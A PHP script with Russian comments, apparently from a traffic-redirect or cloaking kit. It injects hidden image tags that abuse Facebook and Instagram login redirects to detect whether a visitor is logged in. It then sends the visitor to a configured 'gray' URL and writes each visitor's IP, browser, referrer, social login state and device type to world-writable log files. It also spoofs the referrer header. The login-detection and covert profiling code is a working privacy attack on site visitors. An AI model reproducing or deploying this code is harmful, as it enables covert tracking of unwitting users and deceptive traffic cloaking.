<?php
session_start();

$redirect = array();

if (file_exists("redirect_2_1.php"))
    require_once "redirect_2_1.php";

if(isset($_POST["request"])) $request = $_POST["request"];
if(isset($_POST["queryString"])) $queryString = $_POST["queryString"];
if(isset($_POST["state"])) $state = $_POST["state"];
if(isset($_POST["system"])) $system = $_POST["system"];

$queryString = str_replace("?", "", $queryString);
$response = "";

switch ($request) {

    case "include":
        $response = getIncludeScript($redirect, $queryString);

        if ($redirect["isSaveLog"])
            saveUserData("../");
        break;

    case "saveUserData":
        if ($redirect["isSaveLog"])
            saveUserData("../", $system, $state);
        break;

    case "indexUrl":
        $response = "none";

        if ($redirect["staticReffer"]) {
            $_SERVER["HTTP_REFERER"] = $redirect["staticReffer"];
            $response = "set";

            if ($redirect["isSaveSuccesLog"])
                saveUserData("../", "order", "success");
        } // if
        break;
} // switch

die($response);

function getIncludeScript($redirect, $queryString) {
    if(isset($_SESSION["openCounter"])) $openCounter = (int)$_SESSION["openCounter"];
	
    $redirectUrl = $redirect["grayUrl"];

    if($openCounter >= $redirect["openCounter"])
        $redirectUrl = $redirect["counterUrl"];

    $_SESSION["openCounter"] = $openCounter + 1;
    
    preg_match("/\?/", $redirectUrl, $matches);

    $delimParams = count($matches) ? "&" : "?";
    $newUrl = $redirectUrl . ($queryString ? $delimParams . $queryString : "");
    
    ob_start();
    ?>

    <script>
	function refresh(system) {
            //console.log("load system: " + system);

            $.post("php/worked_2_1.php", {request: "saveUserData", state: "logged", system: system}, function (data) {
                <?php if ($redirect["isRedirect"]) { ?>
                        document.location.href = "<?= $newUrl ?>";
                <?php } else { ?>
                        document.location.pathname += "<?= $redirect["grayFolder"] ?>";
                <?php } // if  ?>
            });
        } // refresh

        function error(system) {
            //console.log("error system: " + system);
        } // error

        var arData = {
            facebook: {
                url: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico",
                name: "facebook"
            },

            instagram: {
                url: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico",
                name: "instagram"
            },
        };

        for (key in arData) {
            var item = arData[key];
            var image = '<img class="icon-image" src="' + item.url + '" onload="refresh(\'' + item.name + '\')" onerror="error(\'' + item.name + '\')" style="display: none;" />';

            $("#include_data").append(image);
        } // for in

        $("#include_data").remove();
        $("#remove_script").remove();
    </script>
    <?php
    $markup = ob_get_clean();

    return $markup;
} // getIncludeScript


function getRemoteIPAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return $_SERVER['REMOTE_ADDR'];
} // getRemoteIPAddress


// Сохранить данные о пользователе в файл
function saveUserData($currentPath, $system = "none", $state = "not logged") {
    $visitorIp = getRemoteIPAddress();
    $dateTimeSaved = date("d-m-y__H-i-s");
    $dateTimeVisited = date("d-m-y  H-i-s");

    $path = "{$currentPath}log_users/{$visitorIp}/";
    $fileName = "{$path}{$visitorIp}__{$dateTimeSaved}.txt";

    mkdir($path, 0777);
    chmod($path, 0777);

    $isMobile = detect_mobile_device() ? "да" : "нет";

    $message = <<<EOD
Дата посещения : $dateTimeVisited
IP-адрес пользователя : $visitorIp
Браузер:	$_SERVER[HTTP_USER_AGENT]
Реффер:		$_SERVER[HTTP_REFERER]

Социалка:	$system
Мобильный:	$isMobile
Авторизация: $state
	
EOD;


    $file = fopen($fileName, 'w') or die("не удалось создать файл");
    fwrite($file, $message);

    fclose($file);

    $result = is_file($fileName) ? "Файл успешно сохранен." : "Произошла ошибка, файл не сохранен.";

    return $result;
} // saveUserData


// Определение мобильного устройства
function detect_mobile_device() {
    // check if the user agent value claims to be windows but not windows mobile
    if (stristr(@$_SERVER['HTTP_USER_AGENT'], 'windows') && !stristr(@$_SERVER['HTTP_USER_AGENT'], 'windows ce'))
        return false;

    // check if the user agent gives away any tell tale signs it's a mobile browser
    if (preg_match('/up.browser|up. link |windows ce|iemobile|mini|mmp|symbian|midp|wap|phone|pocket|mobile|pda|psp/i', @$_SERVER['HTTP_USER_AGENT']))
        return true;

    // check the http accept header to see if wap.wml or wap.xhtml support is claimed
    if (isset($_SERVER['HTTP_ACCEPT']) && (stristr($_SERVER['HTTP_ACCEPT'], 'text/vnd.wap.wml') ||
            stristr($_SERVER['HTTP_ACCEPT'], 'application/vnd.wap.xhtml xml')))
        return true;

    // check if there are any tell tales signs it's a mobile device from the server headers
    if (isset($_SERVER['HTTP_X_WAP_PROFILE']) || isset($_SERVER['HTTP_PROFILE']) ||
            isset($_SERVER['X-OperaMini-Features']) || isset($_SERVER['UA-pixels']))
        return true;

    // build an array with the first four characters from the most common mobile user agents
    $a = array('acs-', 'alav', 'alca', 'amoi', 'audi', 'aste', 'avan', 'benq', 'bird', 'blac',
        'bla z', 'brew', 'cell', 'cldc', 'cmd-', 'dang', 'doco', 'eric', 'hipt', 'inno',
        'ipaq', 'java', 'jigs', 'kddi', 'keji', 'leno', 'lg-c', 'lg-d', 'lg-g', 'lge-',
        'maui', 'maxo', 'midp', 'mi ts', 'mmef', 'mobi', 'mot-', 'moto', 'mwbp', 'nec-',
        'newt', 'noki', 'opwv', 'palm', 'pana', 'pant', 'pdxg', 'phil', 'play', 'pluc',
        'port', 'prox', 'qtek', 'qwap', 'sage', 'sams', 's any', 'sch-', 'sec-', 'send',
        'seri', 'sgh-', 'shar', 'sie-', 'siem', 'smal', 'smar', 'sony ', 'sph-', 'symb',
        't-mo', 'teli', 'tim-', 'tosh', 'tsm-', 'upg1', 'upsi', 'vk-v', 'voda', ' w3c ',
        'wap-', 'wapa', 'wapi', 'wapp', 'wapr', 'webc', 'winw', 'winw', 'xda', 'xda-');


    // check if the first four characters of the current user agent are set as a key in the array
    if (isset($a[substr(@$_SERVER['HTTP_USER_AGENT'], 0, 4)]))
        return true;
} // detect_mobile_device 
?>